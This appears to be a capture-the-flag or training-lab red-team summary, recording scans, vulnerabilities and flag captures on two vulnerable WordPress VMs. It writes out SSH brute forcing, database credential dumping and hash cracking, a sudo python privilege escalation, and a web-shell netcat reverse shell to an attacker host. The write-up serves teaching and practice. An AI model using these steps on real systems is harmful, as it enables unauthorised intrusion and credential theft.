# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sT -sV 192.168.1.110
![nmap scan target1](/images/target1namp)

$ nmap -sT -sV 192.168.1.115
![nmap scan target2](/images/target2namp)
```

This scan identifies the services below as potential points of entry:
- Target 1
  - 22/tcp ssh OpenSSH 6.7p1 Debian
  - 80/tcp http Apache httpd 2.4.10
  - 111/tcp rpcbind
  - 139/tcp netbios-ssn Samba smbd
  - 445/tcp netbios-ssn Samba smbd
- Target 2
  - 22/tcp ssh OpenSSH 6.7p1 Debian
  - 80/tcp http Apache httpd 2.4.10
  - 111/tcp rpcbind
  - 139/tcp netbios-ssn Samba smbd
  - 445/tcp netbios-ssn Samba smbd

### Critical Vulnerabilities

The following vulnerabilities were identified on each target:
- Target 1
  - poor password regulation, high severity
  - non-secured configuration files, severely high severity
  - did not restrict all sudo privliedges to non-admin users, high severity
- Target 2
  - non-sanitized entry fields, url command execution, severely high severity
  - non-secured configuration files, severely high severity
  - poor, non-secure password for root, severely high severity

### Exploitation
-See "Final Project Notes" to observe chronological progression and screenshots

The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}
    - Observation of webpage source code
      - non-secured web pages with extractable data
  - `flag2.txt`: {fc3fd58dcdad9ab23faca6e9a36e581c}
    - Metasploit ssh login scan
    - Poor Password Regulation
      - msfconsole
        - use scanner/ssh/ssh_login
        - *change options to match target as 192.168.1.110 and user found from wpscan. Used rockyou.txt.
        - access ssh and navigate directories for flag 2, found in /var/www/flag2.txt
  - `flag3.txt`: {afc01ab56b50591e7dccf93122770cd2}
    - non-secured configuration files
      - extracted root credentials to mysql database in the wp-config.php file
      - logged onto mysql databse via:
        - mysql -u root -p wordpress; password: R@v3nSecurity
      - sql code used to navigate and extract wordpress credentials and password hashes:
        - show database;
        - use wordpress;
        - show tables;
        - describe wp_users;
        - select user_login, user_pass from wp_users;
        - select concat_ws(':', user_login, user_pass)
      - hashes were saved to a file and john the ripper was used to crack the passwords:
        - john wordpress.hashes --wordlist=~/Desktop/rockyou.txt
        - result: steven:pink84
      - website was not pulling the appropriate resources to host the page on the kali web browser
	- change /etc/hosts localhost to the vm of the target machine
      - logged into wordpress site as steven, navigated to posts to find flag3
  - `flag4.txt`: {715dea6c855b9fe3337544932f2941ce}
    -did not restrict all sudo privliedges to non-admin users
      - logged into target1 through ssh via steven:pink84
      - cat sudo priviledges (sudo -l)
      - python exploit discovered to escalate:
        - sudo python -c 'import pty;pty.spawn("/bin/bash")'
      - as root user, navigate to root directory to find flag4
- Target 2
  - change /etc/hosts change localhost to the vm of the target machine
  - `flag1.txt`: {a3c1f66d2b9651bd1a587db5b6ed3e21}
    - Navigated through hosted site pages
      - non-secured web pages with extractable data
  - `flag2.txt`: {6a8ed560f0b5358ecf844108048eb337}
    - Non-sanitized entry fields, url command execution 
      - provided exploit.sh was done to post code for a command execution at 192.168.1.115/backdoor.php?cmd=
      - command the establish reverse shell:
        - in URL: 192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 5500 -e /bin/bash
        - in terminal on kali: nc -nvlp 5500
        - cd ../ and cat flag2.txt
  - `flag3.txt`: {a0f568aa9de277887f37730d71520d9b}
    - non-secured configuration files
      - established a two way shell via:
        - python -c 'import pty;pty.spawn("/bin/bash")'
      - executed find -iname flag3* and found general directory for flag3, but could not read or extract
      - started work to access wordpress credentials for the website
      - extracted root credentials to mysql database in the wp-config.php file     
      - logged onto mysql databse via:
        - mysql -u root -p wordpress; password: R@v3nSecurity
      - sql code used to navigate and extract wordpress credentials and password hashes:
        - show database;
        - use wordpress;
        - show tables;
        - describe wp_users;
        - select user_login, user_pass from wp_users;
        - select concat_ws(':', user_login, user_pass)
      - hashes were saved to a file and john the ripper was used to crack the passwords:
        - john wordpress.hashes --wordlist=~/Desktop/rockyou.txt
        - result: steven:LOLLOL1
      - logged onto wordpress website and found post containing flag3.png
  - `flag4.txt`: {df2bc5e951d91581467bb9a2a8ff4425}
    - poor, non-secure password for root
      - in target2, two way shell, su root, password toor
      - navigate to cd ~, cat flag4.txt